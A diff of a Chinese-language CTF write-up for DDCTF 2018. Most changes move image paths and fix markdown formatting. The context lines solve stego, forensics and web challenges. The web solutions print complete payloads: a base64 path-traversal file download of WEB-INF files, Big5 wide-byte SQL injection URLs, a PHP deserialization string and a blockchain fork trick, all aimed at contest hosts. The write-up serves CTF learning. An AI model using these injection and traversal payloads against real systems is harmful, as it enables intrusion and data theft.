@@ -18,12 +18,12 @@ d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0<b>c4c4</b>c3d4c6fbb9e1b
 
 进一步分析可知，<b>c4</b>和<b>c3</b>刚好相差1，而<b>D</b>和<b>C</b>的ascii值也相差1，<b>c4c4</b>应该就表示"DD", 然后以此类推：
 
-![avatar](/images/ddctf/20180420150038.png)
+![avatar](/assets/ddctf/20180420150038.png)
 
 # 第四扩展FS
 1. 下载下来是一张图片
 
-首先:``` binwalk windows.jpg```
+首先: `binwalk windows.jpg`
 
 ```
 security:/mnt/c/Users/HT/Desktop/ddctf$ binwalk windows.jpg
@@ -47,14 +47,14 @@ Progress: 81.81% (10890274 / 13310878)
 
 2. 然后打开file.txt
 
-![avatar](/images/ddctf/20180420151247.png)  
+![avatar](/assets/ddctf/20180420151247.png)  
 可以看到有很多乱序字符，结合题目的提示，<b>日常违规审计中频次有时候非常重要</b>,可以统计一下每个字符串的个数，并排序。
 
 ```
 grep -o . file.txt | sort |uniq -c | sort -rn
 ```
 
-![avatar](/images/ddctf/20180420151941.png)
+![avatar](/assets/ddctf/20180420151941.png)
 
 然后从新组合一下，就得到flag了。
 
@@ -152,7 +152,7 @@ fp1.write(base64.b64decode(fp.read()))
 
 然后，就可以得到一个file.png。
 
-![avatar](/images/ddctf/20180425151942.png)
+![avatar](/assets/ddctf/20180425151942.png)
 
 然后，就是将图片中的字符串提取出来。
 
@@ -200,11 +200,11 @@ AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH
 ```
 
 
-![avatar](/images/ddctf/20180420184445.png)
+![avatar](/assets/ddctf/20180420184445.png)
 
 然后，查看http包，flag就出来了。
 
-![avatar](/images/ddctf/20180420183706.png)
+![avatar](/assets/ddctf/20180420183706.png)
 
 # 数据库的秘密
 ## X-forwarded-for
@@ -277,35 +277,38 @@ inject(payload_value)
 ```
 
 ## 注意点
-*  每次请求时，js都会计算一个sig值和time值，计算方法在main.js中
-   <code>
-   eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('e f(0,4){5 7=\'\';l(i m 0){n(i!=\'c\'){a=\'\';a=i+\'=\'+0[i];7+=a}}o k(7+4)};5 0={8:\'\',9:\'\',b:\'\',6:\'\',d:h(j v().u()/w)};e x(){0[\'8\']=1.2(\'8\').3;0[\'9\']=1.2(\'9\').3;0[\'b\']=1.2(\'b\').3;0[\'6\']=1.2(\'6\').3;5 c=f(0,4);1.2(\'g\').q="p.s?r="+c+"&d="+0.d;1.2(\'g\').t()}',34,34,'obj|document|getElementById|value|key|var|date|str0|id|title|str1|author|sign|time|function|signGenerate|queryForm|parseInt||new|hex_math_enc|for|in|if|return|index|action|sig|php|submit|getTime|Date|1000|submitt'.split('|'),0,{}))  
-   </code>
+* 每次请求时，js都会计算一个sig值和time值，计算方法在main.js中
+
+   ```js
+   eval(function(p,a,c,k,e,d){e=function(c){return(ca?"":e(parseInt(c/a)))+((c=c%a)35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\b'+e(c)+'\b','g'),k[c]);return p;}('e f(0,4){5 7='';l(i m 0){n(i!='c'){a='';a=i+'='+0[i];7+=a}}o k(7+4)};5 0={8:'',9:'',b:'',6:'',d:h(j v().u()/w)};e x(){0['8']=1.2('8').3;0['9']=1.2('9').3;0['b']=1.2('b').3;0['6']=1.2('6').3;5 c=f(0,4);1.2('g').q="p.s?r="+c+"&d="+0.d;1.2('g').t()}',34,34,'obj|document|getElementById|value|key|var|date|str0|id|title|str1|author|sign|time|function|signGenerate|queryForm|parseInt||new|hex_math_enc|for|in|if|return|index|action|sig|php|submit|getTime|Date|1000|submitt'.split('|'),0,{})) 
+   ```
+
    看上去挺复杂，所以我就用selenium，这样就不用操心sig和time值了。
 
-*  由于需要修改X-forwarded-for值，可以使用代理，我这里采用了更笨的方法，在代码里可以看到:
+* 由于需要修改X-forwarded-for值，可以使用代理，我这里采用了更笨的方法，在代码里可以看到:
 
-```
-driver.get(url)
-input("jixu:")
-```
-首先先发起一次请求，启动webdriver，然后用input()阻塞，这时候，就可以在启动之后的webdriver中安装[Modheader](https://chrome.google.com/webstore/search/modheader?hl=zh-CN)插件，安装完毕，修改好X-forwarded-for之后，就可以在控制台随便输入一个数据，然后，脚本就可以欢快的执行了。
+   ```
+   driver.get(url)
+   input("jixu:")
+   ```
+
+   首先先发起一次请求，启动webdriver，然后用input()阻塞，这时候，就可以在启动之后的webdriver中安装[Modheader](https://chrome.google.com/webstore/search/modheader?hl=zh-CN)插件，安装完毕，修改好X-forwarded-for之后，就可以在控制台随便输入一个数据，然后，脚本就可以欢快的执行了。
 
 # 专属链接
 ## 任意文件下载
 首先F12抓包，会看到一个有意思的请求，http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=,"ZmF2aWNvbi5pY28=",base64_encode之后就是"favicon.ico",图片的内容如下:"you can only download .class .xml .ico .ks files",表明应该是一个下载链接，然后就可以按照war包的格式，下载指定后缀的任意文件了。
 
-![avatar](/images/ddctf/20180421191033.png)
+![avatar](/assets/ddctf/20180421191033.png)
 
 其中需要注意的有三个文件，
 
 * _.._WEB-INF_classes_com_didichuxing_ctf_controller_user_FlagController.class,该文件的地址通过构造"116.85.48.102:5050/flag/test/flag/DDCTF{BASD}"或类似的链接使得网站报错即可得到。
 
- ![avatar](/images/ddctf/201804211191034.png)
+ ![avatar](/assets/ddctf/201804211191034.png)
 
 * _.._WEB-INF_classes_com_didichuxing_ctf_controller_user_StaticController.class,该文件的地址通过构造"116.85.48.102:5050/image/banner/[随便一个错误的地址]"或类似的链接使得网站报错即可得到。
 
- ![avatar](/images/ddctf/20180421191037.png)
+ ![avatar](/assets/ddctf/20180421191037.png)
 
 * _.._WEB-INF_classes_emails.txt_a___,这个文件按理来说是无法下载的，不过我做题的时候，还是可以下载的，可以通过"116.85.48.102:5050/base64_encode('../../WEB-INF/classes/email.txt/a/../')",(注意，base64_encode('../../WEB-INF/classes/email.txt/a/../')是个base64之后的字符串，我这里为了方便大家查看这么写的),就可以绕过了,是个非预期，过了几天，bug修补之后，就没办法下载了，里面的邮箱或者首页的邮箱其实都可以用，所以这个文件下载下不下都无所谓，可惜了，当时应该可以下载数据库的配置文件的，我因为拿到flag就忘记的这一茬，不然，说不定还能改别人的flag，当然我是不可能这么做滴~。
 
@@ -478,7 +481,7 @@ public class cipher {
 ```
 拿到该加密后的邮箱，就可以获得加密后的flag。
 
- ![avatar](/images/ddctf/20180421191047.png)
+ ![avatar](/assets/ddctf/20180421191047.png)
 
 拿到加密之后的flag之后，就可以解密了。
 
@@ -513,37 +516,46 @@ Key key = keyStore.getCertificate("www.didichuxing.com").getPublicKey();
 ## sql注入
 首先，测试单引号，双引号，会发现均会被转义，然后%df，直接就没反应了，过了一会，输了一个中文的单引号"‘"，发现输出竟然乱码。
 
- ![avatar](/images/ddctf/20180421195946.png)
+ ![avatar](/assets/ddctf/20180421195946.png)
 
  然后就输入了几个中文，发现还是乱码，只有输入英文才没有乱码，应该是后台进行了编码转换。
 
- ![avatar](/images/ddctf/20180421200130.png)
+ ![avatar](/assets/ddctf/20180421200130.png)
 
  于是便测试了一下是什么编码，经过测试，发现是Big5编码，后来发现题目在源码里边给出了提示链接（https://wenku.baidu.com/view/bd29b7b3fd0a79563c1e72f7.html)可惜做题时没看到。
 
- ![avatar](/images/ddctf/20180421200307.png)
+ ![avatar](/assets/ddctf/20180421200307.png)
 
  我选择了"么"
 
- ![avatar](/images/ddctf/20180421200748.png)
+ ![avatar](/assets/ddctf/20180421200748.png)
 
- 通过测试"http://116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/well/getmessage/%E4%B9%88'"，可以看到单引号成功逃逸。
+通过测`http://116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/well/getmessage/%E4%B9%88`，可以看到单引号成功逃逸。
 
 ```
-
  最后拼接的参数是 : ?\\'
-​~~~如果自己拼接的参数显示有问题了，试试浏览器的页面编码设置~~~
+~~~如果自己拼接的参数显示有问题了，试试浏览器的页面编码设置~~~
 很遗憾没有找到数据 可以试试别的 ！
 42000 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''?\\''' at line 1
 ```
 单引号成功逃逸，然后就是简单的sql注入获取数据了，报错注入或者直接获取数据均可，还是手工,这里需要注意，部分字符串被过滤，只要双写绕过就行，同时由于编码的原因，直接获取数据的话，会报错编码有问题，我感觉应该就是这原因，出题人把错误展示出来了，需要编码不同的地方添加"collate utf8_general_cli",强制转换编码即可。
 
-* 获取数据库。http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1%E4%B9%88'%20uniunionon%20select%201,2,extracextractvaluetvalue(1,%20concat(0x3a,%20dadatabasetabase(),%200x3a))%23  
+* 获取数据库。
+
+   `http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1%E4%B9%88'%20uniunionon%20select%201,2,extracextractvaluetvalue(1,%20concat(0x3a,%20dadatabasetabase(),%200x3a))%23  `
+
    得到结果"sqli"
-* 获取'sqli'下的table。http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么' uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(table_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23  
+
+* 获取'sqli'下的table。
+
+   `http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么' uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(table_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23 `
    得到结果"message,route_rules"
-* 获取"route_rules"的列名。http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么' uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(column_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23  
+
+* 获取"route_rules"的列名。
+
+* `http://116.85.48.105:5033/4f5aa917-e388-4aa5-bcdc-125b9b95e12a/well/getmessage/1么' uniunionon select 1,2,extracextractvaluetvalue(1, concat(0x3a, (select group_concat(column_name) COLLATE utf8_general_ci from information_schema.tables where table_schema=0x73716c69), 0x3a))%23` 
    得到结果"id,pattern,action,rulepass"
+
 * 然后获取route_rules表中的数据。
    数据如下:  
    1   get*/   u/well/getmessage/   
@@ -552,7 +564,7 @@ Key key = keyStore.getCertificate("www.didichuxing.com").getPublicKey();
    15  static/bootstrap/css/backup.css static/bootstrap/css/backup.zip
 
 ## 代码审计
-通过上边的"116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/static/bootstrap/css/backup.css"，可以拿到代码。
+通过上边的`116.85.48.105:5033/5d71b644-ee63-4b11-9c13-da3c4ac35b8d/static/bootstrap/css/backup.css`，可以拿到代码。
 
 + Jusstry.php
 
@@ -697,7 +709,7 @@ echo serialize(new Test());
 ```
 即可得到序列化之后的值:"hhkjjhkhjkhjkhkjhkhkhkO:17:"Index\Helper\Test":2:{s:9:"user_uuid";s:36:"4f5aa917-e388-4aa5-bcdc-125b9b95e12a";s:2:"fl";O:17:"Index\Helper\Flag":1:{s:3:"sql";O:16:"Index\Helper\SQL":2:{s:3:"dbc";N;s:3:"pdo";N;}}}",然后就可以得到flag了。
 
- ![avatar](/images/ddctf/20180421150038.png)
+ ![avatar](/assets/ddctf/20180421150038.png)
 
 # mini blockchain
 ## 构造符合条件的区块
@@ -744,7 +756,7 @@ with open('captchas.txt', 'w') as f:
 ## 解题
 初始区块链如图所示:
 
- ![avatar](/images/ddctf/20180421221550.png)
+ ![avatar](/assets/ddctf/20180421221550.png)
 
 然后，通过find_block_chain_tail方法，可以知道，该区块链是根据block['height']来判断最后一个区块链，如果构造一个更长的区块链，那么就可以控制整个区块链。
 
@@ -753,15 +765,15 @@ def find_blockchain_tail():
     return max(session['blocks'].values(), key=lambda block: block['height'])
 ```
 
- ![avatar](/images/ddctf/20180421222032.png)
+ ![avatar](/assets/ddctf/20180421222032.png)
 
 从上边的图可以看到，如果构造3个区块，（事实上，也有一定的概率，创建两个区块就行了），那么最后一个区块就是区块6，这时候，一切都回到起点，银行又有了1000000，然后就可以转账，转账之后，在创建一个区块，就可以拿到第一个钻石,如图所示。
 
- ![avatar](/images/ddctf/20180421222814.png)
+ ![avatar](/assets/ddctf/20180421222814.png)
 
 接下来，来获取第二个钻石。这时候，只需要在区块7之后继续创建空的区块就行了。这样，shop又有了1000000，又可以买一个钻石，然后就可以拿到flag了。
 
- ![avatar](/images/ddctf/20180421223014.png)
+ ![avatar](/assets/ddctf/20180421223014.png)
 
 需要注意的是，flask是客户端session，区块多了之后，cookie也会变得很大，由于浏览器cookie是有限制的，这样，当set-cookie的值过大的时候，就会出现set-cookie失败的情况，所以这道题最好使用脚本发包。
 
@@ -770,7 +782,7 @@ def find_blockchain_tail():
 根据提示，下载www.tar.gz,里边共有三个文件，index.php, login.php, register.php。
 ### index.php
 
-```
+```php
 if(isset($_GET['id'])){
     $id = addslashes($_GET['id']);
     if(isset($_GET['title'])){
